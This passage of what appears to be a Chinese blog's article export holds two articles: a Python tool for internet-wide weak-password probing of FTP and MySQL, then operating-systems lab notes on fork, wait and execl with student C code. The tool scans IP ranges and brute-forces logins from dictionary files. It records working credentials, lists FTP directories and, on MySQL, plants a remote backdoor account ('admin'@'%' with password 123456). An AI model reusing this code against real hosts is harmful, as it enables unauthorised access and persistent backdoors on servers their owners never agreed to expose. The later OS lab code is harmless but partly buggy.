socket\nfrom ftplib import FTP\nfrom datetime import datetime\nfrom multiprocessing.dummy import Pool as ThreadPool</code></pre><p>​<br>    class Ftp(object):</p>\n<pre><code>def __init__(self):\n    self.save_path = &quot;./result.txt&quot;\n    self.ip_list = []\n\ndef port_scan(self, ip):\n    t1 = datetime.now()\n    print(&quot;[+] Testing ports of : &quot; + str(ip) + &quot;\\n&quot;)\n    # scan_port(line.strip())\n    # 测试ftp端口是否开放\n    sk1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sk1.settimeout(1)\n    url2 = ip\n    # try_login_ftp(url2, save_path)\n    try:\n        res1 = sk1.connect_ex((ip, 21))\n        # print(res1)\n        if res1 == 0:\n            print(&quot;\\n[+] &quot; + str(url2) + &quot;\\&apos;s ftp service is ok! try to login...\\r\\n&quot;)\n            self.try_login_ftp(url2)\n\n    except Exception as e:\n        print(&quot;\\n[+] &quot; + str(url2) + &quot;\\&apos;s ftp service login failed!&quot; + e + &quot;\\r\\n&quot;)\n    sk1.close()\n    print(datetime.now() - t1)\n    return\n\ndef try_login_ftp(self, ip):\n    # 如果输出 user 和 pwd 为空则说明该 ftp 服务允许匿名访问\n    try:\n        ftp = FTP()\n        ftp.connect(ip)\n        with open(&quot;ftp_dict.txt&quot;, &apos;r&apos;) as f:\n            for line in f.readlines():\n                # print line.strip()\n                user = line.strip().split(&quot;|&quot;)[0]\n                pwd = line.strip().split(&quot;|&quot;)[1]\n                ftp.login(user, pwd)  # 匿名访问\n                # 访问成功\n                print(\n                    &quot;[+] &quot; + str(ip) + &quot;s FTP service login successful！username= &quot; +\n                    user + &quot;pwd = &quot; + pwd + &quot;\\r\\n&quot;)\n                # 将结果写入文件 result.txt\n                avleable_list = &quot;\\rftp service -- &quot; + str(time.asctime()) + &quot; ip: &quot; + \\\n                                str(ip) + &quot; username | pwd : &quot; + str(user) + &quot; | &quot; + str(pwd)\n                self.save_result(self.save_path, avleable_list)\n                # 尝试读取目录\n                print(&quot;\\n[+] &quot; + str(ip) + &quot;s ftp 文件目录为：&quot;)\n                ftp.dir()\n                break\n    except Exception as e:\n        print(e)\n        print(&quot;\\n[+] &quot; + str(self.ip) + &quot;s ftp service is bad!\\r\\n&quot;)\n        pass\n    return\n\ndef save_result(self, save_path, result_list):\n    s = open(self.save_path, &quot;a&quot;)\n    s.write(result_list)\n    s.close()\n    return\n\ndef threadpool(self):\n    with open(&apos;iprange.txt&apos;, &apos;rb&apos;) as f:\n        for line in f.readlines():\n            self.ip_list.append(line.strip())\n    print(self.ip_list)\n    t1 = datetime.now()\n    # 线程数为20\n    pool = ThreadPool(processes=20)\n    try:\n        pool.map(self.port_scan, self.ip_list)\n    except Exception as e:\n        print(e)\n    pool.close()\n    pool.join()\n\n    print(&apos;Multiprocess Scanning Completed in  &apos;, datetime.now() - t1)\n    # port_scan(save_path=&quot;./result.txt&quot;)\n    return</code></pre><p><strong>MySQLModule.py</strong></p>\n<pre><code>import pymysql\nimport socket\nimport time\nfrom datetime import datetime\nfrom multiprocessing.dummy import Pool as ThreadPool\n\nclass MySQL(object):\n\n    def __init__(self):\n        self.save_path = &quot;./result.txt&quot;\n        self.ip_list = []\n\n    def port_scan(self, ip):\n        t1 = datetime.now()\n        print(&quot;[+] Testing ports of : &quot; + str(ip) + &quot;\\n&quot;)\n        # scan_port(line.strip())\n        url1 = ip\n        # 测试mysql端口是否开放\n        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sk.settimeout(1)\n        try:\n            res = sk.connect_ex((ip, 3306))\n            if res == 0:\n                print(&quot;\\n[+] &quot; + str(url1) + &quot;\\&apos;s Mysql is ok! try to login...\\r\\n&quot;)\n                self.try_login_sqlserver(url1)\n\n        except Exception as e:\n            print(&quot;\\n[-] &quot; + str(url1) + &quot;\\&apos;s Mysql is bad! &quot; + e + &quot;\\r\\n&quot;)\n        sk.close()\n        return\n\n    # 尝试登陆mysql服务\n    def try_login_sqlserver(self, ip):\n\n        with open(&apos;dict.txt&apos;, &apos;r&apos;) as f:\n            for line in f.readlines():\n                print(&quot;[+] Testing ip: &quot; + str(ip) + &quot; &amp; testing password：&quot; + line.strip())\n\n                # information_schema 是 Mysql 的默认数据库，我们有权限操作\n                # PyMysql.cursors.DictCursor 以字典方式进行连接参数管理\n                try:\n                    connection = pymysql.connect(host=ip,\n                                                 user=&apos;root&apos;,\n                                                 password=line.strip(),\n                                                 db=&apos;information_schema&apos;,\n                                                 charset=&apos;utf8mb4&apos;,\n                                                 cursorclass=pymysql.cursors.DictCursor)\n\n                    print(&quot;\\n[+] Testing ip: &quot; + str(ip) + &quot; Login successfully! try to set a backdoor account...\\r\\n&quot;)\n                    result_list = &quot;\\nsql service -- &quot; + str(time.asctime()) + &quot; ip: &quot; + str(ip) + &quot; pwd : &quot; + \\\n                                  str(line.strip())\n                    self.save_result(result_list)\n                    # 后门账号密码为 admin 123456\n                    self.try_set_backdoor(connection)\n                    connection.close()\n                except Exception as e:\n                    # print &quot;[-] &quot; + str(e.message)\n                    print(&quot;\\n[+] Testing ip: &quot; + str(ip) + &quot;  Using weakly password login failed!...&quot; + str(e) + &quot;\\r\\n&quot;)\n                pass\n        return\n\n    def try_set_backdoor(self, connection):\n        try:\n            with connection.cursor() as cursor:\n                # 创建一个新用户\n                sql = &quot;CREATE user &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;;&quot;\n                cursor.execute(sql)\n                # 将后门用户权限给到最大\n                cursor.execute(&quot;flush privileges;&quot;)\n                connection.commit()\n                connection.close()\n\n                print(&quot;[+] New account set successfully!\\r\\n&quot;)\n        except Exception as e:\n            # print e\n            print(&quot;[-] New account set failed! &quot; + str(e) + &apos;\\r\\n&apos;)\n        return\n\n    def save_result(self, result_list):\n        s = open(self.save_path, &quot;a&quot;)\n        s.write(result_list)\n        s.close()\n        return\n\n    def threadpool(self):\n        with open(&apos;iprange.txt&apos;, &apos;rb&apos;) as f:\n            for line in f.readlines():\n                self.ip_list.append(line.strip())\n        print(self.ip_list)\n        t1 = datetime.now()\n        # 线程数为20\n        pool = ThreadPool(processes=20)\n        try:\n            pool.map(self.port_scan, self.ip_list)\n        except Exception as e:\n            print(e)\n        pool.close()\n        pool.join()\n\n        print(&apos;Multiprocess Scanning Completed in  &apos;, datetime.now() - t1)\n        # port_scan(save_path=&quot;./result.txt&quot;)\n        return</code></pre><h3 id=\"遇到问题\"><a href=\"#遇到问题\" class=\"headerlink\" title=\"遇到问题\"></a>遇到问题</h3><p>在网上找到弱口令账号之后，对方并没有开启远程登陆，也没法登陆成功！该怎么解决呢？明天再看看！12/16/2019 5:34:36 PM </p>\n<p>答：如果不开启远程登陆，就无法远程连接该数据库，视为未开放弱口令</p>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><blockquote>\n<p><a href=\"https://www.cnblogs.com/KevinGeorge/p/7858564.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/KevinGeorge/p/7858564.html</a></p>\n<p><a href=\"https://nmap.org/man/zh/man-host-discovery.html\" target=\"_blank\" rel=\"noopener\">https://nmap.org/man/zh/man-host-discovery.html</a></p>\n<p><a href=\"https://pypi.org/project/pcap-ct/\" target=\"_blank\" rel=\"noopener\">https://pypi.org/project/pcap-ct/</a></p>\n<p><a href=\"https://github.com/PyMySQL/PyMySQL/\">https://github.com/PyMySQL/PyMySQL/</a></p>\n<p><a href=\"https://blog.csdn.net/rebelqsp/article/details/22109925\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/rebelqsp/article/details/22109925</a></p>\n<p><a href=\"https://www.jb51.net/article/62238.htm\" target=\"_blank\" rel=\"noopener\">https://www.jb51.net/article/62238.htm</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_33805992/article/details/86435703\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/weixin_33805992/article/details/86435703</a></p>\n</blockquote>\n","text":"互联网sql、ftp服务弱口令探测12/11/2019 1:26:12 PM 设计思路给定网段，扫描存活主机(def get_ip)，将IP地址存放在 iprange.txt 中由于这一阶段的探测目标是指定服务，因此我们跳过端口扫描阶段，直接进行特定端口探测(def port_s","link":"","raw":null,"photos":[],"categories":[{"name":"tool","slug":"tool","count":1,"path":"api/categories/tool.json"}],"tags":[{"name":"MySql","slug":"MySql","count":2,"path":"api/tags/MySql.json"},{"name":"FTP","slug":"FTP","count":1,"path":"api/tags/FTP.json"},{"name":"scan","slug":"scan","count":1,"path":"api/tags/scan.json"}]},{"title":"OS","slug":"OS","date":"2020-04-29T05:40:34.000Z","updated":"2020-05-05T05:57:20.565Z","comments":true,"path":"api/articles/OS.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"OS\"><a href=\"#OS\" class=\"headerlink\" title=\"OS\"></a>OS</h1><h2 id=\"实验一-进程控制\"><a href=\"#实验一-进程控制\" class=\"headerlink\" title=\"实验一 进程控制\"></a>实验一 进程控制</h2><p> <strong>fork()</strong></p>\n<p>用于创建一个新进程（子进程）。</p>\n<p>函数原型：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">pid_t</span> fork(<span class=\"keyword\">void</span>);</span><br></pre></td></tr></table></figure>\n\n<p>返回：子进程中为0，父进程中为子进程ID，出错为-1。</p>\n<p>子进程被创建后就进入就绪队列和父进程分别独立地等待调度。子进程继承父进程的程序段代码，子进程被调度执行时，也会和父进程一样从fork()返回。从共享程序段代码的角度来看，父进程和子进程所执行的程序代码是同一个，在内存中只有一个程序副本；但是从编程的角度来看，为了使子进程和父进程做不同的事，需要在程序中区分父进程和子进程的代码段。这需要借助于fork()的返回值来标志当前进程的身份。从fork()返回后，都会执行语句：<code>pid=frok();</code></p>\n<p>得到返回值pid有三种情况，分别对应出错（小于0）、在父进程中（大于0）、在子进程中（等于0）。</p>\n<p>由于父进程和子进程各自独立地进入就绪队列等待调度，所以谁会先得到调度是不确定的，这与系统的调度策略和系统当前的资源状态有关。因此谁会先从fork()返回并继续执行后面的语句也是不确定的。</p>\n<p> <strong>wait()</strong></p>\n<p>查询子进程的退出状态(即正常退出的退出码或导致异常终止的信号)，并回收子进程的内核资源。</p>\n<p>函数原型：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/wait.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">pid_t</span> wait(<span class=\"keyword\">int</span> *status);</span><br></pre></td></tr></table></figure>\n\n<p>返回值：若成功则返回进程ID，若出错则返回-1。</p>\n<p>Wait()函数常用来控制父进程和子进程的同步。在父进程中调用wait()函数，则父进程被阻塞，进入等待队列，等待子进程结束。当子进程结束时，会产生一个终止状态字，系统会向父进程发送SIGCHLD信号。当接到信号后，父进程提取子进程的终止状态字，从wait()函数返回继续执行原程序。</p>\n<p><strong>exit()</strong></p>\n<p>exit()是进程结束最长调用的函数，在main()函数中调用return，最终也是调用exit()函数。这些都是进程的正常终止。在正常终止时，exit()函数返回进程结束状态。</p>\n<p>函数原型：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">exit</span><span class=\"params\">(<span class=\"keyword\">int</span> status)</span></span></span><br></pre></td></tr></table></figure>\n\n<p>从OS角度来看，进程终止会释放进程用户空间的所有资源，而进程描述符并不释放，它将来由其父进程回收。若父进程先于子进程终止，子进程成为“孤儿进程”，“孤儿进程”会被init进程（进程号为1）领养；若子进程先于父进程终止，子进程成为“僵尸进程”，父进程尚未对其进行善后处理(获取终止子进程的有关信息，释放它仍占用的资源)。</p>\n<p><strong>execl()</strong></p>\n<p>系统调用execl()可以将新程序加载到某一进程的内存空间，该进程会从新程序的main()函数开始执行。</p>\n<p>函数原型：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">execl</span> <span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"keyword\">char</span>*pathname, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *arg0,…<span class=\"comment\">/*(char*)0*/</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\">pathname是要加载程序的全路径名，arg0及以后为参数列表。</span><br></pre></td></tr></table></figure>\n\n<p>  进程的用户内存空间被替换，而进程的其他属性基本不改变。进程完整的内存空间：正文区、堆区、栈区、数据区都被替换，原内容不存在了。代码替换完后，在execl()后面的代码毫无意义。</p>\n<p>example.c</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//print.c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc,<span class=\"keyword\">char</span> *argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">char</span> *m=(<span class=\"keyword\">char</span> *)argv[<span class=\"number\">1</span>];</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\\n\"</span>,m);</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//example1.c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">pid_t</span> pid;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>((pid=fork())&lt;<span class=\"number\">0</span>)&#123;   <span class=\"comment\">//出错</span></span><br><span class=\"line\">     <span class=\"built_in\">printf</span>(<span class=\"string\">\"fork faild\\n\"</span>);</span><br><span class=\"line\">     <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(pid==<span class=\"number\">0</span>)&#123;    <span class=\"comment\">//子进程执行</span></span><br><span class=\"line\">     <span class=\"built_in\">printf</span>(<span class=\"string\">\"Child process!\\n\"</span>);</span><br><span class=\"line\">     <span class=\"built_in\">printf</span>(<span class=\"string\">\"PID=%d  PPID=%d \\n\"</span>,getpid(),getppid()); <span class=\"comment\">//getpid()获取进程号, getppid()获取父进程号</span></span><br><span class=\"line\">     execl(<span class=\"string\">\"print\"</span>,<span class=\"string\">\"print\"</span>,<span class=\"string\">\"hello\"</span>,<span class=\"literal\">NULL</span>);  <span class=\"comment\">//代码替换</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span>&#123;    <span class=\"comment\">//父进程执行</span></span><br><span class=\"line\">     wait();</span><br><span class=\"line\">     <span class=\"built_in\">printf</span>(<span class=\"string\">\"Parent process!\\n\"</span>);</span><br><span class=\"line\">     <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">编译运行方法：</span><br><span class=\"line\"><span class=\"meta\">#gcc print.c –o print</span></span><br><span class=\"line\"><span class=\"meta\">#gcc example1.c –o example</span></span><br><span class=\"line\">#./example</span><br></pre></td></tr></table></figure>\n\n<p>编写一段程序，使用系统调用fork()创建两个子进程，当此程序运行时，在系统中有一个父进程和两个子进程活动。让每一个进程在屏幕上显示“身份信息”：父进程显示“Parent process! PID=xxx1 PPID=xxx2”；子进程显示“Childx process! PID=xxx PPID=xxx”。多运行几次，观察记录屏幕上的显示结果，并分析原因。</p>\n<p>说明：</p>\n<blockquote>\n<p>xxx1为进程号，用getpid()函数可获取进程号；</p>\n<p>xxx2为父进程号，用getppid()函数可获取父进程号；</p>\n<p>Childx中x为1和2，用来区别两个子进程；</p>\n<p>wait()函数用来避免父进程在子进程终止之前终止。</p>\n</blockquote>\n<p>fork.c</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/wait.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> <span class=\"keyword\">const</span> *argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">pid_t</span> child1,child2;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(child1=fork()==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Child1 process! PID=%d  PPID=%d \\n\"</span>,getpid(),getppid());</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(child1&lt;<span class=\"number\">0</span>||child2&lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"fork error.\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"comment\">//exit(0);</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> status;</span><br><span class=\"line\">\t\twait(&amp;status);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Parent process! PID=%d  PPID=%d \\n\"</span>,getpid(),getppid());</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(child2=fork()==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Child2 process! PID=%d  PPID=%d \\n\"</span>,getpid(),getppid());</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(child2&lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"fork error.\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"comment\">//exit(0);</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> status;</span><br><span class=\"line\">\t\twait(&amp;status);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Parent process! PID=%d  PPID=%d \\n\"</span>,getpid(),getppid());</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure>\n\n<p>fork()和exec()系列函数能同时运行多个程序，利用上述函数将下面单进程顺序执行的程序single.c改造成可并发执行3个进程的程序 multi_process.c ；并用time命令获取程序的执行时间，比较单进程和多进程运行时间，并分析原因。 </p>\n<p>multi_process.c</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> NUM 5</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">print_msg</span><span class=\"params\">(<span class=\"keyword\">char</span> *m)</span> </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123; </span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i; </span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i&lt;NUM; i++)&#123; </span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\"</span>,m); </span><br><span class=\"line\">\t\tfflush(<span class=\"built_in\">stdout</span>); </span><br><span class=\"line\">\t\tsleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">pid_t</span> pid[<span class=\"number\">3</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=<span class=\"number\">3</span>;i++)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tpid[i<span class=\"number\">-1</span>]=fork();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(pid[i<span class=\"number\">-1</span>]==<span class=\"number\">0</span>||pid[i<span class=\"number\">-1</span>]==<span class=\"number\">-1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pid[<span class=\"number\">0</span>]==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tprint_msg(<span class=\"string\">\"Good\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(pid[<span class=\"number\">1</span>]==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tprint_msg(<span class=\"string\">\"Hello\"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(pid[<span class=\"number\">2</span>]==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tprint_msg(<span class=\"string\">\"2017****10\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\twait();</span><br><span class=\"line\"></span><br><span class=\"line\">\twait();</span><br><span class=\"line\"></span><br><span class=\"line\">\twait();</span><br><span 